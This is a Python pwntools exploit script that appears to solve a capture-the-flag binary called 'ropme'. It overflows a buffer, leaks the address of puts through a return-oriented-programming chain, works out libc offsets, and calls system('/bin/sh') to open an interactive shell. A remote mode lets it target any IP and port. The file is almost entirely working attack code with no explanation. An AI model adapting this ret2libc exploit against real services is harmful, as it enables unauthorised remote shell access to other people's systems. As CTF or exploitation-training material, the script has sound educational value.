from pwn import *

#Debug useage - python3 GDB
#Remote usage - python3 REMOTE <IP> <PORT>

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
				
gdbscript = '''
init-peda
b main
c
'''.format(**locals())

exe = "./ropme"
elf = context.binary = ELF(exe, checksec=False)

context.log_level = "info"

io = start()

#offset - 64
junk = b'A'*72

main = p64(0x0000000000400626)

#Leaking puts address - 
pop_rdi = p64(0x00000000004006d3)
puts_got = p64(0x601018)
puts_plt = p64(0x00000000004004e0)

payload = junk + pop_rdi + puts_got + puts_plt + main

io.sendlineafter(b"dah?", payload)
io.recvline()
leak = io.recvuntil('dah?').split()[0]
leak = u64(leak.ljust(8,b'\x00'))
log.success(f'Leaked puts address at: {hex(leak)}')

#Submitted the remotly leaked puts address to: https://libc.rip/
#Remote libc version - libc6_2.23-0ubuntu9_amd64
libc_base = leak - 0x6f690
system = libc_base + 0x45390
bin_sh = libc_base + 0x18cd17

log.success(f'Leaked libc base address at: {hex(libc_base)}')
log.success(f'Leaked system address at: {hex(system)}')
log.success(f'Leaked /bin/sh address at: {hex(bin_sh)}')

payload2 = junk + pop_rdi + p64(bin_sh) + p64(system)

io.sendline(payload2)
io.interactive()
